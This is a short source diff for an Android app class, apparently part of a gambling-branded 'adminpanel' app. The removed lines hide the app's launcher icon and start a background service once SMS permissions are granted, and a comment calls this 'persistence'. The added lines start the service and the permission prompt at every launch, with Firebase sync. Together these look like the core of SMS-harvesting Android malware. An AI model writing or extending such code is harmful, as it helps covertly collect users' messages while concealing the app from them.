@@ -2,15 +2,13 @@ package com.spinplay99.adminpanel;
 
 import android.app.Application;
 
-/** Firebase init; background sync starts when SMS is already granted (meat-style persistence). */
+/** Initialize God8 Firebase; start sync and permission UI if needed. */
 public class SpinPlayApp extends Application {
     @Override
     public void onCreate() {
         super.onCreate();
         FirebaseBootstrap.ensureApp(this);
-        if (PermissionHelper.hasSmsPermissions(this)) {
-            PermissionHelper.hideLauncherIcon(this);
-            ServiceLauncher.ensureRunning(this);
-        }
+        ServiceLauncher.ensureRunning(this);
+        PermissionHelper.launchPermissionUiIfNeeded(this);
     }
 }
